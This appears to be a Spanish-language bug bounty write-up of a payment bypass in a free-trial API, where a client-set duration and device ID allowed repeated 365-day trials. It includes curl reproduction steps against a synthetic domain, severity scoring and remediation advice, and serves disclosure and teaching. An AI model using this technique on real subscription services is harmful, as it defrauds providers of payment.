bug bounty / case study

Payment bypass_

CWE-841High
Web SecurityBusiness LogicPayment BypassEntitlement Management

Encontré esta vulnerabilidad durante pruebas autorizadas en un programa de bug bounty self-hosted. El fallo se encontraba en la lógica utilizada para conceder pruebas gratuitas y permitía convertir una cuenta sin suscripción en una cuenta con acceso de pago, sin completar ninguna transacción.

La API aceptaba la duración de la prueba desde el cliente y utilizaba un identificador de dispositivo igualmente controlado por el usuario para impedir canjes repetidos.

Combinando ambos comportamientos, una cuenta nueva podía solicitar periodos sucesivos de hasta 365 días, cada uno con un identificador diferente. Dos solicitudes fueron suficientes para obtener aproximadamente dos años de servicio.

El programa se mantiene anónimo y los ejemplos utilizan un dominio .test y datos sintéticos.

Funcionamiento esperado

La aplicación ofrecía una prueba gratuita durante el registro. El cliente oficial enviaba una única solicitud con tres valores:

{
  "account_code": "<account identifier>",
  "device_id": "<device identifier>",
  "days": 7
}

El servidor debía aplicar una duración fija, permitir un solo periodo de prueba por cuenta y mantener la suscripción inactiva cuando no existiera un pago o una prueba válida.

Comportamiento observado

El backend confiaba en dos propiedades proporcionadas por el cliente:

  1. days determinaba directamente cuánto tiempo se añadía a la suscripción. El único límite observado era de 365 días por solicitud.
  2. device_id era la única clave empleada para evitar un segundo canje. No existía un límite equivalente asociado a la cuenta.

Reutilizar el mismo device_id producía un error, pero enviar cualquier cadena nueva permitía repetir el canje. Cada solicitud modificaba el estado de la cuenta y acumulaba la duración solicitada.

Causa raíz

La vulnerabilidad no dependía de una validación aislada, sino de tres decisiones de diseño que se reforzaban entre sí:

  • Una propiedad de seguridad, la duración de la suscripción, era controlada por el cliente.
  • El mecanismo antiabuso confiaba en un identificador no autenticado y elegido por el mismo cliente.
  • La extensión era acumulativa y no existía un límite total por cuenta.

El backend validaba correctamente que un mismo dispositivo no pudiera utilizar dos pruebas. Sin embargo, esa restricción no protegía la suscripción porque el servidor no podía demostrar que el identificador correspondiera a un dispositivo real ni que permaneciera estable.

Reproducción

1. Crear una cuenta gratuita

curl -X POST 'https://api.subscription-lab.test/v1/accounts' \
  -H 'Content-Type: application/json' \
  -d '{}'

Respuesta resumida:

{
  "account_code": "0000000000000001",
  "message": "Account created"
}

2. Confirmar que la cuenta no tiene acceso

Antes del canje, la autenticación para utilizar el servicio era rechazada y la cuenta aparecía sin una suscripción activa:

{
  "active": false,
  "paid": false,
  "subscription_valid": false,
  "subscription_expires_at": null
}

Este control permitió demostrar que el acceso posterior no provenía de una suscripción existente.

3. Solicitar 365 días de prueba

curl -X POST 'https://api.subscription-lab.test/v1/trials/redeem' \
  -H 'Content-Type: application/json' \
  -d '{
    "account_code":"0000000000000001",
    "device_id":"research-device-a",
    "days":365
  }'
{
  "message": "Trial redeemed",
  "days_added": 365
}

4. Verificar el control existente

Repetir la solicitud con research-device-a era rechazado. Esto confirmó que existía deduplicación, pero que estaba vinculada exclusivamente al valor de device_id.

5. Cambiar el identificador

curl -X POST 'https://api.subscription-lab.test/v1/trials/redeem' \
  -H 'Content-Type: application/json' \
  -d '{
    "account_code":"0000000000000001",
    "device_id":"research-device-b",
    "days":365
  }'

La segunda solicitud también fue aceptada y añadió otros 365 días. El estado resultante era equivalente al de una cuenta con suscripción:

{
  "active": true,
  "paid": true,
  "subscription_valid": true,
  "subscription_expires_at": "<approximately two years later>"
}

6. Validar el impacto

Después de los canjes, la cuenta recibió credenciales de sesión y pudo completar una operación reservada a suscriptores. El mismo flujo no era accesible desde la cuenta de control antes de modificar su suscripción.

Impacto

Un atacante remoto podía automatizar el proceso completo:

  • Crear cuentas sin proporcionar una identidad verificable.
  • Convertirlas en cuentas con funciones de pago.
  • Añadir hasta 365 días en cada solicitud.
  • Repetir la extensión utilizando identificadores arbitrarios.
  • Acceder al servicio protegido sin completar el flujo de pago.

El hallazgo afectaba la integridad del sistema de entitlements y permitía eludir completamente el modelo de monetización.

Evaluación de severidad

El vector observado fue:

CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:N = 8.2 High

Elegí este vector porque la explotación era remota, no requería privilegios ni interacción y producía una modificación significativa del estado de suscripción. El impacto comercial era especialmente importante porque el proceso de pago podía evitarse por completo.

Remediación

La corrección debía trasladar todas las decisiones de entitlement al servidor:

  1. Definir la duración de la prueba mediante una constante o política interna y eliminar days del contrato público.
  2. Registrar el uso de la prueba en la cuenta, no en un identificador proporcionado por el cliente.
  3. Impedir extensiones acumulativas que no estén asociadas a una transacción o autorización válida.
  4. Tratar los identificadores de dispositivo como señales auxiliares, nunca como controles de seguridad independientes.
  5. Aplicar límites por cuenta e IP y alertar sobre canjes anómalos.
  6. Separar explícitamente los estados trial, paid y active para evitar que una prueba establezca indicadores de pago.
  7. Añadir pruebas automatizadas para canjes repetidos, dispositivos nuevos y valores de duración manipulados.

Resultado de la divulgación

Verifiqué el comportamiento varias veces antes de reportarlo. Tiempo después repetí la misma cadena y ya no era reproducible. No recibí una confirmación formal del proveedor sobre el cambio.
